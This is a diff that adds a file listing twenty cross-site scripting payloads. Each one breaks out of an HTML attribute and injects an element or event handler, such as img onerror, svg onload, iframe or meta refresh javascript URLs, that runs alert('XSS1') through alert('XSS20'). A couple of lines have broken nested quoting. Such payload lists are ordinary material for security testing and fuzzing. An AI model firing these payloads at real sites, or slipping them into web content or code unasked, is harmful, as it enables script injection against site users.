@@ -1,0 +1,20 @@
+"><img src=x onerror=alert('XSS1')>
+"><svg onload=alert('XSS2')>
+"><body onload=alert('XSS3')>
+"><iframe src=javascript:alert('XSS4')></iframe>
+"><input type=text value="><script>alert('XSS5')</script>">
+"><a href="javascript:alert('XSS6')">Click me</a>
+"><embed src=javascript:alert('XSS7')>
+"><object data=javascript:alert('XSS8')></object>
+"><form action=javascript:alert('XSS9')><input type=submit></form>
+"><link rel=stylesheet href=data:text/css;base64,body{background:url('javascript:alert('XSS10')')}>
+"><img src=1 onerror=alert('XSS11') alt="
+"><video><source onerror=alert('XSS12')></video>
+"><audio src=javascript:alert('XSS13')></audio>
+"><details open ontoggle=alert('XSS14')></details>
+"><marquee onstart=alert('XSS15')>XSS</marquee>
+"><button onclick=alert('XSS16')>Click me</button>
+"><div style=background-image:url('javascript:alert('XSS17')')>
+"><textarea onfocus=alert('XSS18')></textarea>
+"><span onclick=alert('XSS19')>Click me</span>
+"><meta http-equiv=refresh content="0;url=javascript:alert('XSS20')">
